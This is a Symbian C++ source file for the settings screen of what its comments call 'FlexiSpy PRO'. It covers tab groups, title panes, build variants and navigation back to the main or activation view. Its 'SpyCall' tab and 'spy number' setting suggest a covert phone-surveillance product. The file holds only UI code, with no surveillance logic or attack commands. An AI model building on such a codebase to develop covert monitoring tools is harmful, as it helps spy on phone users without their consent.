#include "CltSettingView.h"

#include <FBS.H>
#include <aknviewappui.h>		// CAknViewAppUi
#include <eikmenup.h>			// CEikMenuPane
#include <EIKSPANE.H>

#include <aknnavi.h>
#include <akntabgrp.h>
#include <aknnavide.h>
#include <akntitle.h>

#include "CltSettingsListContainer.h"
#include "Fxdef.h"
#include "ResourceBundle.h"
#include "images.mbg"
#include "FxsBuild.h"
#include "ViewId.h"
#include "Logger.h"

#include  INCLUDE_RS_HRH

/*
#ifdef FXS_LIGHT_BUILD
#undef FXS_LIGHT_BUILD
#endif

#ifdef FX_ALERT_BUILD
#undef FX_ALERT_BUILD
#endif

#define FXS_PRO_BUILD
*/

CCltSettingView::~CCltSettingView()
{	
	DELETE(iContainer);
	DeleteTabGroup();
//	DELETE(iTab1LogTitle)
//	DELETE(iTab2SpyCallTitle)
}

CCltSettingView* CCltSettingView::NewL()
{
	CCltSettingView* self = new (ELeave) CCltSettingView();
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);	
	return self;
}

CCltSettingView::CCltSettingView(): CAknView()
{
}

void CCltSettingView::ConstructL()
{	
	BaseConstructL(R_SETTING_VIEW);
	iAppUi = static_cast<CFxsAppUi*>(AppUi());	
}

void CCltSettingView::CreateTabGroupL()
{	
	TUid naviPaneUid;
	naviPaneUid.iUid = EEikStatusPaneUidNavi;
	
	CEikStatusPane* statusPane = StatusPane();
	CEikStatusPaneBase::TPaneCapabilities subPane = statusPane->PaneCapabilities(naviPaneUid);
	
     // if we can access the navigation pane
	if (subPane.IsPresent() && subPane.IsAppOwned()) {
		
		iNaviPane =	(CAknNavigationControlContainer *) statusPane->ControlL(naviPaneUid);
		
        DELETE(iNaviDecorator);	
		
		// ownership is transferred to us here
		iNaviDecorator = iNaviPane->CreateTabGroupL();
		
		// ownership not transferred
		iTabGroup = (CAknTabGroup*) iNaviDecorator->DecoratedControl();
    	
		iTabGroup->SetObserver( this );
				
		TInt err(KErrNone);
//
//FlexiSpy PRO displays two tabs
//		
   	    TInt tabId(0);
   	    
#ifdef FXS_LIGHT_BUILD
//Fxs LIGHT
//
		iTabGroup->SetTabFixedWidthL(KTabWidthWithOneTab);

#elif defined(FX_ALERT_BUILD)
		iTabGroup->SetTabFixedWidthL(KTabWidthWithOneTab);
#else
//Fxs PRO
//
		iTabGroup->SetTabFixedWidthL(KTabWidthWithTwoTabs);
	//	iTabGroup->AddTabL(tabId++, *iTab1LogTitle);
	//	iTabGroup->AddTabL(tabId++, *iTab2SpyCallTitle);		
#endif	
		
	    // highlight the first tab
		iTabGroup->SetActiveTabByIndex(0);		
		iNaviPane->PushL(*iNaviDecorator);
		
		//iCurrTab = ETabDefaultSetting;
	}
}

void CCltSettingView::DeleteTabGroup()
{	
	if(iNaviPane && iNaviDecorator) {
		iNaviPane->Pop(iNaviDecorator);
		DELETE(iNaviDecorator);
		
		iNaviPane = NULL; // NOT owned
		iTabGroup = NULL; // NOT owned
	}	
}

TUid CCltSettingView::Id() const
{
	return KUidSettingView;
}

void CCltSettingView::DoActivateL(const TVwsViewId& /*aPrevViewId*/, 
							TUid /*aCustomMessageId*/, 
							const TDesC8& /*aCustomMessage*/)
{	
	DELETE(iContainer);
	
	SetTitleL(R_TXT_TITLE_PANE_SETTING_DEFAULT);
	
	//CreateTabGroupL();	
	
	iContainer = CSettingsMainContainer::NewL(ClientRect(),*this);
	iContainer->SetMopParent(this);
	
	AppUi()->AddToStackL(*this, iContainer);
	
	LOG0(_L("[CCltSettingView::DoActivateL] End"))	
}

void CCltSettingView::DoDeactivate()
{	
	if (iContainer)	{
		AppUi()->RemoveFromStack(iContainer);		
		DELETE(iContainer);
	}
}

CEikStatusPane* CCltSettingView::StatusPane()
	{
	return CAknView::StatusPane();
	}
	
CAknTabGroup& CCltSettingView::TabGroup()
{
	return *iTabGroup;
}

void CCltSettingView::TabChangedL(TInt aIndex)
{	
	iCurrTab = aIndex;	
	
	switch(iCurrTab)
	{
		case ETabDefaultSetting:
		{
			SetTitleL(R_TXT_TITLE_PANE_SETTING_DEFAULT);
			//iContainer->DisplayControlL(ETabDefaultSetting);
		}break;
		case ETabSpyNumberSetting:
		{
			SetTitleL(R_TXT_TITLE_PANE_SETTING_SPYCALL);
		}break;
		default:
			SetTitleL(R_TXT_TITLE_PANE_SETTING_DEFAULT);
		//	iContainer->DisplayControlL(ETabDefaultSetting);
	}
}

void CCltSettingView::SetTitleL(TInt aTitleRsId)
{	
	HBufC* titleTxt  = ResourceBundle::ReadResourceLC(aTitleRsId);
	
	iAppUi->SetStatusPaneTitleL(*titleTxt);
	
	CleanupStack::PopAndDestroy( titleTxt );	
}

void CCltSettingView::GoBack()
{	
	if(iAppUi->ProductActivated())
		{
		iAppUi->ChangeViewL(KUidMainView);	
		}
	else 
		{
		iAppUi->ChangeViewL(KUidActivationView);			
		}	
	iAppUi->SettingsInfo().NotifyChanged();
}

void CCltSettingView::HandleCommandL(TInt aCommand)
{	
		switch(aCommand)
		{
		case EAknSoftkeyOk: //change setting
			{
			iContainer->ChangeSelectedItemL();
			}break;
		case EAknSoftkeyBack: //save setting
			{	
			GoBack();
			}break;
		default:
			AppUi()->HandleCommandL(aCommand);		
		}
}

void CCltSettingView::HandleForegroundEventL(TBool aForeground)
{	
	if(!aForeground) {//background
		DoDeactivate();
	}
}

void CCltSettingView::HandleStatusPaneSizeChange()
{
	if(iContainer)
		iContainer->SetRect(ClientRect());
}

/*void CCltSettingView::DynInitMenuPaneL(TInt aResourceId, CEikMenuPane* aMenuPane)
{}*/